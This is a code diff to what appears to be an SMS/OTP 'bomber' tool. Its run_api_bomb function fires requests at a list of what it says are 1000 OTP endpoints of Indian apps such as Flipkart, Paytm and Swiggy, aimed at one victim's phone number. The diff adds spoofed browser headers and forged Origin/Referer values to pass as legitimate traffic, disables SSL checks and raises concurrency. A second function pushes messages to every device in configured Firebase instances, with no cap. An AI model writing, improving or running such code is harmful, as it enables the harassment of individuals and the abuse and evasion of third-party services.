@@ -1018,25 +1018,107 @@ ULTIMATEAPIS = [
 ]
 
 
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/109.0.0.0 Mobile Safari/537.36',
-    'Accept': 'application/json',
+# ─────────────────────────── Browser-like Headers ───────────────────────────
+
+# Base headers — real Android Chrome on Samsung S21
+_BASE_HEADERS = {
+    'User-Agent':      'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Accept':          'application/json, text/plain, */*',
+    'Accept-Language': 'en-IN,en-GB;q=0.9,en;q=0.8,hi;q=0.7',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection':      'keep-alive',
+    'sec-ch-ua':       '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    'sec-ch-ua-mobile':   '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'Sec-Fetch-Site':  'same-origin',
+    'Sec-Fetch-Mode':  'cors',
+    'Sec-Fetch-Dest':  'empty',
+    'X-Requested-With': 'XMLHttpRequest',
 }
+
+# Per-domain Origin + Referer so each app sees a legit same-site request
+_DOMAIN_HEADERS = {
+    'meesho.com':          {'Origin': 'https://meesho.com',        'Referer': 'https://meesho.com/'},
+    'oyorooms.com':        {'Origin': 'https://oyorooms.com',       'Referer': 'https://oyorooms.com/'},
+    'bigbasket.com':       {'Origin': 'https://bigbasket.com',      'Referer': 'https://bigbasket.com/'},
+    'nykaa.com':           {'Origin': 'https://nykaa.com',          'Referer': 'https://nykaa.com/'},
+    'paytm.com':           {'Origin': 'https://paytm.com',          'Referer': 'https://paytm.com/'},
+    'pharmeasy.in':        {'Origin': 'https://pharmeasy.in',       'Referer': 'https://pharmeasy.in/'},
+    'uber.com':            {'Origin': 'https://m.uber.com',         'Referer': 'https://m.uber.com/'},
+    'jupiter.money':       {'Origin': 'https://jupiter.money',      'Referer': 'https://jupiter.money/'},
+    'swiggy.com':          {'Origin': 'https://swiggy.com',         'Referer': 'https://swiggy.com/'},
+    'doubtnut.com':        {'Origin': 'https://doubtnut.com',       'Referer': 'https://doubtnut.com/'},
+    'rapido.bike':         {'Origin': 'https://rapido.bike',        'Referer': 'https://rapido.bike/'},
+    'goibibo.com':         {'Origin': 'https://goibibo.com',        'Referer': 'https://goibibo.com/'},
+    'amazon.in':           {'Origin': 'https://www.amazon.in',      'Referer': 'https://www.amazon.in/'},
+    'zomato.com':          {'Origin': 'https://www.zomato.com',     'Referer': 'https://www.zomato.com/'},
+    'zepto.com':           {'Origin': 'https://www.zeptonow.com',   'Referer': 'https://www.zeptonow.com/'},
+    'pokerbaazi.com':      {'Origin': 'https://pokerbaazi.com',     'Referer': 'https://pokerbaazi.com/'},
+    'flipkart.com':        {'Origin': 'https://www.flipkart.com',   'Referer': 'https://www.flipkart.com/'},
+    'myntra.com':          {'Origin': 'https://www.myntra.com',     'Referer': 'https://www.myntra.com/'},
+    'blinkit.com':         {'Origin': 'https://blinkit.com',        'Referer': 'https://blinkit.com/'},
+    'wakefit.co':          {'Origin': 'https://www.wakefit.co',     'Referer': 'https://www.wakefit.co/'},
+    'gokwik.co':           {'Origin': 'https://gokwik.co',          'Referer': 'https://gokwik.co/'},
+    'instamart.com':       {'Origin': 'https://www.swiggy.com',     'Referer': 'https://www.swiggy.com/instamart'},
+    'shiprocket.in':       {'Origin': 'https://app.shiprocket.in',  'Referer': 'https://app.shiprocket.in/'},
+    'newme.asia':          {'Origin': 'https://newme.asia',         'Referer': 'https://newme.asia/'},
+    'ajio.com':            {'Origin': 'https://www.ajio.com',       'Referer': 'https://www.ajio.com/'},
+    'cred.club':           {'Origin': 'https://cred.club',          'Referer': 'https://cred.club/'},
+    'khatabook.com':       {'Origin': 'https://khatabook.com',      'Referer': 'https://khatabook.com/'},
+    'tatacapital.com':     {'Origin': 'https://www.tatacapital.com','Referer': 'https://www.tatacapital.com/'},
+    'makemytrip.com':      {'Origin': 'https://www.makemytrip.com', 'Referer': 'https://www.makemytrip.com/'},
+    'dmart.ready.in':      {'Origin': 'https://www.dmart.in',       'Referer': 'https://www.dmart.in/'},
+    '1mg.com':             {'Origin': 'https://www.1mg.com',        'Referer': 'https://www.1mg.com/'},
+    'zivame.com':          {'Origin': 'https://www.zivame.com',     'Referer': 'https://www.zivame.com/'},
+    'phonepe.com':         {'Origin': 'https://www.phonepe.com',    'Referer': 'https://www.phonepe.com/'},
+    'olacabs.com':         {'Origin': 'https://www.olacabs.com',    'Referer': 'https://www.olacabs.com/'},
+    'lenskart.com':        {'Origin': 'https://www.lenskart.com',   'Referer': 'https://www.lenskart.com/'},
+    'juno.lenskart.com':   {'Origin': 'https://www.lenskart.com',   'Referer': 'https://www.lenskart.com/'},
+}
+
+def _get_domain_headers(url: str) -> dict:
+    """Extract domain-specific Origin/Referer headers for the given URL."""
+    try:
+        from urllib.parse import urlparse
+        host = urlparse(url).netloc.lower()
+        # strip www. prefix for matching
+        host_bare = host.replace('www.', '')
+        for domain, hdrs in _DOMAIN_HEADERS.items():
+            if host_bare.endswith(domain) or host.endswith(domain):
+                return hdrs
+    except Exception:
+        pass
+    return {}
 
 # ─────────────────────────── API Bomb ───────────────────────────
 
 async def _hit_one(session: aiohttp.ClientSession, api: dict, phone: str) -> dict:
     try:
-        hdrs = {**HEADERS, **api.get('headers', {})}
+        # Merge: base → domain-specific → api-specific (Content-Type etc.)
+        hdrs = {
+            **_BASE_HEADERS,
+            **_get_domain_headers(api['url']),
+            **api.get('headers', {}),
+        }
         body = api['data'](phone)
-        async with session.post(api['url'], json=body, headers=hdrs, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+        async with session.post(
+            api['url'], json=body, headers=hdrs,
+            timeout=aiohttp.ClientTimeout(total=3),
+            allow_redirects=True,
+        ) as resp:
+            # Read response so cookies are stored in the jar
+            await resp.read()
             return {'name': api['name'], 'status': resp.status, 'ok': resp.status in (200, 201, 202, 204)}
+    except asyncio.TimeoutError:
+        return {'name': api['name'], 'status': 0, 'ok': False, 'err': 'timeout'}
     except Exception as e:
         return {'name': api['name'], 'status': 0, 'ok': False, 'err': str(e)[:40]}
+
 
 async def run_api_bomb(phone: str, cycles: int = 1) -> dict:
     """
     Hits every API in ULTIMATEAPIS `cycles` times.
+    Uses real browser headers + per-domain Origin/Referer + shared cookie jar.
     Returns {total, success, failed}.
     """
     phone = ''.join(filter(str.isdigit, phone))
@@ -1045,14 +1127,26 @@ async def run_api_bomb(phone: str, cycles: int = 1) -> dict:
 
     total = success = failed = 0
 
-    connector = aiohttp.TCPConnector(limit=200, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
+    # CookieJar(unsafe=True) — allows cookies on IP/non-standard domains
+    jar = aiohttp.CookieJar(unsafe=True)
+    connector = aiohttp.TCPConnector(
+        limit=500,
+        limit_per_host=20,
+        ssl=False,
+        enable_cleanup_closed=True,
+        force_close=False,
+    )
+
+    async with aiohttp.ClientSession(connector=connector, cookie_jar=jar) as session:
         for _ in range(cycles):
+            # Fire all 1000 APIs simultaneously — gather with return_exceptions
             tasks = [_hit_one(session, api, phone) for api in ULTIMATEAPIS]
-            results = await asyncio.gather(*tasks)
+            results = await asyncio.gather(*tasks, return_exceptions=True)
             for r in results:
                 total += 1
-                if r['ok']:
+                if isinstance(r, Exception):
+                    failed += 1
+                elif r.get('ok'):
                     success += 1
                 else:
                     failed += 1
@@ -1069,7 +1163,6 @@ async def run_custom_bomb(phone: str, message: str, count: int, firebase_list: l
     Returns {total, success, failed, phone, note}.
     """
     from firebase_service import prepare_firebase_tasks
-    import httpx
 
     phone = ''.join(filter(str.isdigit, phone))
     if len(phone) == 10:
@@ -1077,48 +1170,46 @@ async def run_custom_bomb(phone: str, message: str, count: int, firebase_list: l
 
     if not firebase_list:
         return {
-            'total': 0,
-            'success': 0,
-            'failed': 0,
+            'total': 0, 'success': 0, 'failed': 0,
             'phone': phone,
             'note': 'No Firebase instances configured. Add one via Admin → Bomber Settings.',
         }
 
-    # Build task list — no cap, use ALL active devices across ALL instances
+    # Build task list — no cap, use ALL active devices
     tasks = await prepare_firebase_tasks(firebase_list, phone, message, max_success=None)
 
     if not tasks:
         return {
-            'total': 0,
-            'success': 0,
-            'failed': 0,
+            'total': 0, 'success': 0, 'failed': 0,
             'phone': phone,
             'note': 'No active devices found across configured Firebase instances.',
         }
 
     success = failed = 0
-    sem = asyncio.Semaphore(50)
+    sem = asyncio.Semaphore(80)  # higher concurrency for Firebase PUT
 
-    async def do_put(task):
-        nonlocal success, failed
-        async with sem:
-            try:
-                import json as _json
-                async with aiohttp.ClientSession() as session:
+    # One shared session for all Firebase PUTs — faster than per-task sessions
+    connector = aiohttp.TCPConnector(limit=200, ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+
+        async def do_put(task):
+            nonlocal success, failed
+            async with sem:
+                try:
                     async with session.put(
                         task["url"],
                         data=task["data"],
                         headers={**task["headers"], "Content-Type": "application/json"},
-                        timeout=aiohttp.ClientTimeout(total=15),
+                        timeout=aiohttp.ClientTimeout(total=10),
                     ) as r:
                         if r.status in (200, 201, 204):
                             success += 1
                         else:
                             failed += 1
-            except Exception:
-                failed += 1
+                except Exception:
+                    failed += 1
 
-    await asyncio.gather(*[do_put(t) for t in tasks])
+        await asyncio.gather(*[do_put(t) for t in tasks])
 
     return {
         'total':   success + failed,
